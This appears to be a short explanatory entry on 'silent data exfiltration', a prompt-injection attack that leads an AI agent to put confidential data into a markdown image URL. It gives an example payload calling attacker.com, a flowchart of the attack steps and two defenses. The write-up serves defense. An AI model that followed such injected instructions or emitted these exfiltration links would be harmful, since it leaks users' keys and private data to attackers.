# Silent Data Exfiltration Loops

## Overview
**Silent Data Exfiltration** represents an attack where a prompt injection forces an LLM to retrieve confidential information (like chat history, passwords, or documents) and transmit it to an external server controlled by the attacker, without notifying the user.

## Attack Mechanics
The attack typically exploits features like markdown rendering or URL fetching. The injected instructions tell the model to encode the private data inside a URL parameters block and fetch an external image or resource (e.g., using `![tracking](http://attacker.com/log?data=sensitive)`).

```mermaid
flowchart TD
    User[User] -->|Asks Agent to Summarize Document| Agent[AI Agent]
    Agent -->|Reads Document with Payload| Payload[Injection Payload]
    Payload -->|Instructs model to steal API keys| Agent
    Agent -->|Formats API keys into URL| Link[http://attacker.com/exfiltrate?key=XYZ]
    Agent -->|Triggers Markdown Image Render| AttackerServer[Attacker Server Receives Data]
```

## Defense
- Restrict agents from making arbitrary external web connections.
- Content Security Policies (CSP) to restrict allowed domains for markdown image rendering.
